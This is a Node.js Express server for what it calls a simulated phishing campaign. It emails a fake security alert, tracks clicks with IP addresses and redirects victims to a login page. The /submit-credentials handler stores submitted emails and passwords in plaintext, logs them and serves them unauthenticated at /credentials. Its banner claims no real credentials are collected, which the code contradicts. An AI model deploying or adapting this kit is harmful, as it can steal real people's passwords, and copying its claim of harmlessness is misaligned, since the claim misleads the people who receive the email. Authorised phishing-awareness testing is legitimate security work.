const mongoose = require("mongoose");
const PhishingClick = require("./models/PhishingClick");
const CapturedCredential = require("./models/CapturedCredential");


require("dotenv").config();
const express = require("express");
const cors = require("cors");
const nodemailer = require("nodemailer");
const axios = require("axios");
const cheerio = require("cheerio");
const path = require("path"); // ✅ Needed to serve React build

const app = express();
app.use(express.static("public"));

// CORS setup: allow ngrok and localhost origins from .env
const allowedOrigins = process.env.ALLOWED_ORIGINS
  ? process.env.ALLOWED_ORIGINS.split(",")
  : [
      "http://localhost:3000",
      "http://localhost:5000"
    ];
app.use(cors({
  origin: function (origin, callback) {
    if (!origin) return callback(null, true);
    if (allowedOrigins.indexOf(origin) === -1) {
      const msg = `The CORS policy for this site does not allow access from the specified Origin: ${origin}`;
      return callback(new Error(msg), false);
    }
    return callback(null, true);
  },
  credentials: true
}));
app.use(express.json());

// Connect to MongoDB
mongoose
  .connect(process.env.MONGO_URI)
  .then(() => console.log("✅ MongoDB connected"))
  .catch((err) => console.error("❌ MongoDB error:", err));

const PORT = process.env.PORT || 5000;


// Configure Email Transporter
const BASE_URL = process.env.BASE_URL || "http://localhost:5000";
const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST || "smtp.gmail.com",
  port: process.env.SMTP_PORT || 587,
  secure: false,
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

// API Endpoint to Send Phishing Email
app.post("/send-phishing-email", async (req, res) => {
  const { recipientEmail } = req.body;

  if (!recipientEmail) {
    return res.status(400).json({ error: "Recipient email is required" });
  }

  try {
    // Static HTML email content (you can customize this)
    const emailContent = `
      <div style="background: #fff3cd; color: #856404; text-align: center; padding: 10px; font-size: 14px; font-weight: 500; border-bottom: 1px solid #ffeeba;">
        This email is part of a <strong>simulated phishing campaign for educational purposes only</strong>. No real credentials are being collected.
      </div>
      <p>Hello,</p>
      <p>We detected unusual login activity in your account. Please <a href=\"${BASE_URL}/track-click?email=${recipientEmail}\">click here to verify</a>.</p>
      <p>Thank you,<br/>Security Team</p>
    `;

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: recipientEmail,
      subject: "Important Security Alert",
      html: emailContent,
    };

    await transporter.sendMail(mailOptions);
    res.json({ message: "Phishing email sent successfully!" });
  } catch (error) {
    console.error("Error sending phishing email:", error);
    res.status(500).json({ error: "Failed to send email" });
  }
});


// API Endpoint to Track Clicks on Phishing Links
app.get("/track-click", async (req, res) => {
  const { email } = req.query;

  if (!email) {
    return res.status(400).json({ error: "Email is required" });
  }

  try {
    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;

    // ✅ Only create a record if it doesn't exist already for this email
    const alreadyClicked = await PhishingClick.findOne({ email });

    if (!alreadyClicked) {
      await PhishingClick.create({ email, ipAddress: ip });
    }

    res.redirect(`${BASE_URL}/login.html`);
  } catch (error) {
    console.error(error);
    res.status(500).send("Error tracking click");
  }
});


// Get all phishing click data
app.get("/clicks", async (req, res) => {
  try {
    const clicks = await PhishingClick.find().sort({ timestamp: -1 });
    res.json(clicks);
  } catch (error) {
    console.error("Error fetching clicks:", error);
    res.status(500).json({ error: "Failed to fetch click data" });
  }
});

// Get all captured credentials
app.get("/credentials", async (req, res) => {
  try {
    const credentials = await CapturedCredential.find().sort({ timestamp: -1 });
    res.json(credentials);
  } catch (error) {
    console.error("Error fetching credentials:", error);
    res.status(500).json({ error: "Failed to fetch credentials" });
  }
});

// API Endpoint to Save Submitted Credentials
app.post("/submit-credentials", async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: "Email and password required" });
  }

  try {
    await CapturedCredential.findOneAndUpdate(
      { email }, // Match by email
      {
        $set: { password, timestamp: new Date() } // Update password and timestamp
      },
      { upsert: true, new: true } // Insert if not found
    );

    console.log("Captured credentials saved/updated:", { email, password });
    res.redirect("https://www.microsoft.com");
  } catch (err) {
    console.error("Error saving credentials:", err);
    res.status(500).json({ error: "Server error" });
  }
});


app.get("/api/phishing-clicks", async (req, res) => {
  try {
    const clicks = await PhishingClick.find().sort({ timestamp: -1 }); // latest first
    res.json(clicks);
  } catch (error) {
    console.error("Error fetching click data:", error);
    res.status(500).json({ error: "Failed to fetch click data" });
  }
});

// ✅ Serve React frontend
app.use(express.static(path.join(__dirname, "phishing-sim-ui", "build")));

app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "phishing-sim-ui", "build", "index.html"));
});

// Start Server
app.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
});
